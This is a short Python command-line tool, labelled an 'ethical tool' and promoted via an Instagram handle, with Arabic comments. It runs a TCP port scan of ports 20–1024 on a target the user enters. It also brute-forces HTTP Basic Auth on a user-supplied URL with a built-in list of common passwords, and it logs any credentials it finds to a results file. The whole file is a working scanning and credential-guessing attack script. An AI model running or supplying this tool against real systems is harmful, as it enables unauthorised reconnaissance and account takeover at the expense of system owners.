#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import requests
from requests.auth import HTTPBasicAuth
import itertools
import sys
from colorama import Fore, Style, init
import datetime

init(autoreset=True)

# 🔹 دالة حفظ النتائج
def save_result(text):
    with open("results.txt", "a", encoding="utf-8") as f:
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        f.write(f"{timestamp} {text}\n")

# 🔹 البانر
def banner():
    print(Fore.MAGENTA + r"""
██████╗  ██████╗ ██╗   ██╗███████╗ ██████╗  █████╗     ███████╗███╗   ██╗
██╔══██╗██╔═══██╗██║   ██║██╔════╝██╔════╝ ██╔══██╗    ██╔════╝████╗  ██║
██║  ██║██║   ██║██║   ██║█████╗  ██║  ███╗███████║    █████╗  ██╔██╗ ██║
██║  ██║██║   ██║██║   ██║██╔══╝  ██║   ██║██╔══██║    ██╔══╝  ██║╚██╗██║
██████╔╝╚██████╔╝╚██████╔╝███████╗╚██████╔╝██║  ██║    ███████╗██║ ╚████║
╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝

                """ + Fore.YELLOW + "      [DOVEGA E.N Ethical Tool]\n"
          + Fore.CYAN + "                Instagram: @DOVEGA_EN\n")

# 🔹 فحص البورتات
def port_scan(target):
    print(Fore.GREEN + f"\n[+] Scanning ports on {target} ...")
    save_result(f"Started port scan on {target}")
    for port in range(20, 1025):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(Fore.CYAN + f"    [OPEN] Port {port}")
                save_result(f"Port {port} OPEN on {target}")
            sock.close()
        except Exception as e:
            save_result(f"Error on port {port}: {e}")

# 🔹 تجربة كلمات مرور بسيطة (Bruteforce HTTP Basic Auth)
def simple_bruteforce(url, username, wordlist):
    print(Fore.GREEN + f"\n[+] Starting bruteforce on {url} with user {username} ...")
    save_result(f"Started bruteforce on {url} with user {username}")
    for password in wordlist:
        try:
            response = requests.get(url, auth=HTTPBasicAuth(username, password.strip()))
            if response.status_code == 200:
                print(Fore.YELLOW + f"[+] Password found: {password.strip()}")
                save_result(f"SUCCESS: {username}:{password.strip()} on {url}")
                return
        except Exception as e:
            save_result(f"Error during bruteforce: {e}")
    print(Fore.RED + "[-] No password found in wordlist")
    save_result("Bruteforce finished, no password found")

# 🔹 القائمة الرئيسية
def menu():
    banner()
    print(Fore.CYAN + """
[1] Port Scan
[2] Simple Bruteforce (HTTP Basic Auth)
[0] Exit
""")

    choice = input(Fore.YELLOW + "Select option: ")

    if choice == "1":
        target = input("Enter target IP/Domain: ")
        port_scan(target)

    elif choice == "2":
        url = input("Enter target URL: ")
        username = input("Enter username: ")
        wordlist = ["admin", "1234", "password", "toor", "letmein"]
        simple_bruteforce(url, username, wordlist)

    elif choice == "0":
        print(Fore.RED + "Exiting...")
        sys.exit()

    else:
        print(Fore.RED + "Invalid choice!")

if __name__ == "__main__":
    menu()
